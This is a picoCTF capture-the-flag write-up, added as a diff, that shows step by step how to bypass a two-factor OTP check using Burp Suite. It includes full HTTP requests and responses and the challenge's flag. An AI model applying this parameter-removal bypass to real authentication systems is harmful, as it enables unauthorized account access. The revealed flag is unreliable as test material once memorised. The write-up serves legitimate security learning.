@@ -1,3 +1,120 @@
 Description
 Try here to find the flag
 
+Open Burpsuite
+http://titan.picoctf.net:57977/
+
+proxy > turn on intercept and click open browser
+search the link in the browser
+click on forward x2
+go to HTTP History and click the url favicon.ico
+___________________________________________________________________________________________________________________________________________________
+url : http://titan.picoctf.net:57977/favicon.ico
+Request 
+GET /favicon.ico HTTP/1.1
+Host: titan.picoctf.net:57977
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Referer: http://titan.picoctf.net:57977/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: session=eyJjc3JmX3Rva2VuIjoiNGNkZDAwNTU2YmU5MGQ4N2IxYTExMjcwMDFmMzE3YmRjYjlhY2Q5YyJ9.ZxiaHQ.h7cTyeGrPQY8pHOFCCeEm8qct5Y
+Connection: close
+
+Respond 
+HTTP/1.1 404 NOT FOUND
+Server: Werkzeug/3.0.1 Python/3.8.10
+Date: Wed, 23 Oct 2024 06:39:27 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 207
+Connection: close
+<!doctype html>
+<html lang=en>
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+__________________________________________________________________________________________________________________________________________________
+
+you will see a form fill it up and clich register
+you will see the following request packet in the intercept
+____________________________________________________________________________________________________________________________________________________________
+Intercept
+
+POST / HTTP/1.1
+Host: titan.picoctf.net:57977
+Content-Length: 204
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://titan.picoctf.net:57977
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://titan.picoctf.net:57977/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: session=eyJjc3JmX3Rva2VuIjoiNGNkZDAwNTU2YmU5MGQ4N2IxYTExMjcwMDFmMzE3YmRjYjlhY2Q5YyJ9.ZxiaHQ.h7cTyeGrPQY8pHOFCCeEm8qct5Y
+Connection: close
+csrf_token=IjRjZGQwMDU1NmJlOTBkODdiMWExMTI3MDAxZjMxN2JkY2I5YWNkOWMi.ZxiaHQ.ok5aURbeJDDeK5Me53cpwzTzqoc&full_name=qwerty&username=asdfgh&phone_number=1234567890&city=newyork&password=qwerty&submit=Register
+______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+click on forward x2
+you will have a 2 factor authentication page in the browser
+just enter any value and click submit
+click forword x2
+go to HTTP history 
+click the url Dashboard with tick mark in params column
+in the request click the 3 line icon > send to repeater
+now go to repeater
+
+you will have the request
+____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+Request 
+POST /dashboard HTTP/1.1
+Host: titan.picoctf.net:57977
+Content-Length: 12
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://titan.picoctf.net:57977
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://titan.picoctf.net:57977/dashboard
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: session=.eJxNjEsOgzAMRO_iNYuYX0gvg5LYKRWQ0ASEEOrd60UXXb6ZeXODf-0XPCDyeaU8QwW-5DDuaeYoceuJlOq63rFRNGiHFrHWSmFoUDvyzlhPxosXjmUZo11ZtPfJWW4rSPsmOGisEQU3W8qZMv1PtilFHuOxOs6SY920Xa8Ho6Q7CuffpS0UnhN8vm5jN2E.ZxibSA.Q4L-GwLmGoxdKC30OXTt_OmBDuE
+Connection: close
+otp=1234qewr
+____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+we will edit the request a bit by deleting the otp we will send the request without otp.
+new request will be
+____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+Request 
+POST /dashboard HTTP/1.1
+Host: titan.picoctf.net:57977
+Content-Length: 12
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://titan.picoctf.net:57977
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://titan.picoctf.net:57977/dashboard
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: session=.eJxNjEsOgzAMRO_iNYuYX0gvg5LYKRWQ0ASEEOrd60UXXb6ZeXODf-0XPCDyeaU8QwW-5DDuaeYoceuJlOq63rFRNGiHFrHWSmFoUDvyzlhPxosXjmUZo11ZtPfJWW4rSPsmOGisEQU3W8qZMv1PtilFHuOxOs6SY920Xa8Ho6Q7CuffpS0UnhN8vm5jN2E.ZxibSA.Q4L-GwLmGoxdKC30OXTt_OmBDuE
+Connection: close
+____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+click on send
+____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.1 Python/3.8.10
+Date: Wed, 23 Oct 2024 06:57:39 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 107
+Vary: Cookie
+Connection: close
+Welcome, asdfgh you sucessfully bypassed the OTP request. 
+Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_c94b61ac}
+____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+we got the flag !!!!!!
